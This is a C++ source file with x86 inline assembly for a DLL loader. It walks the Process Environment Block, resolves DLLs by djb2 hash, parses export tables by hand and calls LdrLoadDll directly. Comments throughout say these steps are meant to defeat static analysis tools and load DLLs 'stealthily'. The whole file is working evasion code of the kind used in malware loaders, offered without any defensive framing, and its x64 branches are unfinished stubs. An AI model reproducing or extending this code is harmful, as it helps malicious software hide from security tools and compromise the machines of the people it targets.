#include "ldr.h"

// This loader consists of several main blocks:

// string_compare: This function compares two strings and returns a value indicating their relative order. It uses inline assembly to perform the comparison, which can make it harder for static analysis tools to understand what it's doing.

// _findDllAddress: This function finds the base address of a DLL in memory. It does this by iterating over the loaded modules in the process until it finds the one with the matching hash. This is part of the Dynamic API Resolving technique, which makes it harder for static analysis tools to determine what the code is doing.

// _findFunctionAddress: This function finds the address of a function within a DLL. It does this by looking at the export directory of the DLL and finding the function with the matching name. This is another part of the Dynamic API Resolving technique.

// djb2: This function implements the djb2 hash algorithm, which is used to hash the names of the DLLs and functions. This makes it harder for static analysis tools to determine which DLLs and functions are being used.

// _LoadLibrary: This function is a custom implementation of the LoadLibrary function, which is used to load a DLL into a process. It uses the _findDllAddress and _findFunctionAddress functions to find the addresses of the RtlInitUnicodeString and LdrLoadDll functions, which it then calls to load the DLL. This is a stealthy way of loading a DLL, as it doesn't use the standard LoadLibrary function.

DWORD string_compare(PWSTR param1, PWSTR param2) // aaaa = aaaa
{
	DWORD _ret = 0x0;
#if defined(__x86_64__) || defined(_M_X64) 

	printf_s("x64 coming soon\n");
#elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
	__asm
	{
		pushad
		pushfd
		mov edi, esp
	
		xor eax, eax
		xor ebx, ebx
		xor ecx, ecx
		xor edx, edx

		mov eax, [param1]
		mov ebx, [param2]

		loop1:
			mov dl, [eax + ecx]
			mov dh, [ebx + ecx]
			inc ecx
			cmp dl, 0
			je _find
			cmp dl, dh
			je loop1
			jl _condition1
			jg _condition2

		_find : //s1 == s2
			cmp dh, 0
			jne _condition1
			mov edx, 0x1
			jmp far ayh

		_condition1 : // s1 < s2
			mov edx, 0x2
			jmp far ayh

		_condition2 : // s1 > s2
			mov edx, 0x3
			jmp far ayh

		ayh :
			mov _ret, edx
			mov esp, edi
			popfd
			popad
	

	}
#endif
	return _ret;
}

// This comment is describing a path through the Windows process memory structures to find the base address of the kernel32.dll library.

// Here's a high-level explanation:

// TEB: Thread Environment Block. This is a data structure that contains information about the current thread.

// PEB: Process Environment Block. This is a data structure that contains information about the current process. The TEB has a pointer to the PEB.

// Ldr: This is a field in the PEB that points to the PEB_LDR_DATA structure, which contains information about the modules (DLLs) loaded by the process.

// InMemoryOrderModuleList: This is a doubly-linked list that contains a LDR_DATA_TABLE_ENTRY for each module. The modules are sorted in the order they were loaded.

// currentProgram->ntdll->kernel32.BaseDll: This seems to be describing a path through the InMemoryOrderModuleList to find the kernel32.dll module. However, it's not clear what currentProgram refers to in this context. Typically, you would traverse the InMemoryOrderModuleList until you find the LDR_DATA_TABLE_ENTRY for kernel32.dll, and then the BaseDll field would give you the base address of the DLL.

// This path is likely used in the _findDllAddress function to find the base address of a DLL given its hash. The function would traverse the InMemoryOrderModuleList until it finds a DLL with a matching hash, and then return its base address.
// //TEB->PEB->Ldr->InMemoryOrderLoadList->currentProgram->ntdll->kernel32.BaseDll

DWORD _findDllAddress(unsigned int dll)
{

	DWORD dll_base = 0x0;
	DWORD _NULL_dll = NULL;

#if defined(__x86_64__) || defined(_M_X64) 

	printf_s("x64 coming soon\n");
#elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)

	__asm
	{

		pushad
		pushfd
		mov edi, esp

		xor eax, eax
		xor ebx, ebx
		xor ecx, ecx
		xor esi, esi

		mov eax, fs : [0x30]								//PEB
		mov eax, [eax + 0xC]								//_PEB_findDllAddress_DATA LDR
		mov eax, [eax + 0x14]								//LDR_DATA_TABLE_ENTRY InMemoryOrderModuleList
		mov ebx, eax
		nop

		loop1 :
			mov ecx, dword ptr[ebx - 0x8 + 0x2C + 0x4]		//BaseDllName
			cmp ecx, _NULL_dll
			mov esi, [ebx - 0x8 + 0x18]						//Dllbase
			je ayh
			push ecx
			push dll
			call djb2 
			mov ebx, [ebx]
			cmp eax, 0x1
			jne loop1
			jz _find

			_find :
				mov esi, esi
				mov dll_base, esi
				jmp ayh
		ayh:
			mov esp, edi
			popfd
			popad

		
	}
#endif
	
	return dll_base;
}

//Function RVA = IMAGE_EXPORT_DIRECTORY -> Address Table RVA + (Ordinal * 4)

DWORD _findFunctionAddress(DWORD dll, LPCSTR function)
{

	DWORD function_address = 0;

#if defined(__x86_64__) || defined(_M_X64) 
	printf_s("x64 coming soon\n");
#elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
	__asm
	{
		pushad
		pushfd

		mov edi, esp
		
		sub esp, 0x14

		mov[edi - 0x4], eax			// Dll Base
		mov[edi - 0x8], eax			// Number of Functions
		mov[edi - 0xC], eax			// Address Table RVA
		mov[edi - 0x10], eax		// Name Pointer Table RVA
		mov[edi - 0x14], eax		// Ordinal Table RVA

		mov ebx, dll
		mov[edi - 0x4], ebx			//store dll base ebx

		mov eax, [ebx + 0x3C]		//kernel32.dll -> IMAGE_DOS_HEADER -> 0X3C = 0XF8
		add eax, ebx				//IMAGE_NT_HEADER -> 0XF8 = 4550 (dllbase + 0xF8) 

		mov eax, [eax + 0x78]		// 0xF8 + 0x78 = 0x170 RVA of Export Table 0
		add eax, ebx				// Export Table RVA + dllbase 

		mov ecx, [eax + 0x14]		// IMAGE_EXPORT_DIRECTORY -> 0x14 = Number of Functions
		mov[edi - 0x8], ecx

		mov ecx, [eax + 0x1C]		// IMAGE_EXPORT_DIRECTORY -> 0x1C = Address Table RVA
		mov[edi - 0xC], ecx

		mov ecx, [eax + 0x20]		// IMAGE_EXPORT_DIRECTORY -> 0x20 = Name Pointer Table RVA
		mov[edi - 0x10], ecx

		mov ecx, [eax + 0x24]		// IMAGE_EXPORT_DIRECTORY -> 0x24 = Ordinal Table RVA
		mov[edi - 0x14], ecx

		mov esi, 0x0

		mov edx, [edi - 0x10]		// IMAGE_EXPORT_DIRECTORY -> 0x20 = Name Pointer Table RVA = 0x000947f4
		add edx, ebx

		loop1 :
		mov eax, [edx + esi * 4]
			add eax, ebx 
			push eax
			push function
			call string_compare
			sub eax, 0x1
			cmp eax, 0x0
			je _find
			xor eax, eax
			mov eax, [edi - 0x8]
			sub eax, esi
			cmp eax, 0x0
			je ayh
			inc esi
			jne loop1

		_find:
				xor eax, eax
				xor ebx, ebx
				xor ecx, ecx
				xor edx,edx
				mov eax, [edi - 0x14]
				add esi, esi
				add eax, esi
				mov edx, [edi - 0x4]
				add eax, edx
				mov cx,word ptr [eax]
				add cx,cx
				add cx,cx 
				mov ebx, [edi - 0xC]
				add ebx,ecx 
				add ebx,edx 
				mov ebx, [ebx]
				add edx, ebx
				mov function_address, edx
				jmp ayh

		ayh:
			add esp, 0x14
			mov esp, edi 
			popfd
			popad
	}
#endif

	return function_address;
}

DWORD djb2(unsigned int* dll_hash, PWSTR word)
{
	unsigned int hash = 5381;
	int c;
	unsigned int dhash = reinterpret_cast<unsigned int>(dll_hash);


	while ((c = *word++))
	{
		if (isupper(c))
		{
			c = c + 32;
		}

		hash = ((hash << 5) + hash) + c;
	}

	if (dhash == hash)
		return 0x1;
	else
		return 0x0;
}

/*LdrLoadDll: This is a low-level function to load a DLL into a process, just like LoadLibrary.
Normal programs use LoadLibrary, and the presence of this import may indicate a program that is attempting to be stealthy.*/

void _LoadLibrary(const wchar_t* ldrstring) //give Dll Name
{
	UNICODE_STRING ldrldll;


	_RtlInitUnicodeString _pRtlInitUnicodeString = (_RtlInitUnicodeString)_initialize(djb2_values[0], (LPCSTR)"RtlInitUnicodeString",0);
	_LdrLoadDll _pLdrLoadDll = (_LdrLoadDll)_initialize(djb2_values[0], (LPCSTR)"LdrLoadDll",0);

	(_RtlInitUnicodeString)_pRtlInitUnicodeString(&ldrldll, ldrstring);
	HANDLE _dllModule = NULL;
	(_LdrLoadDll)_pLdrLoadDll(NULL, 0, &ldrldll, &_dllModule);

}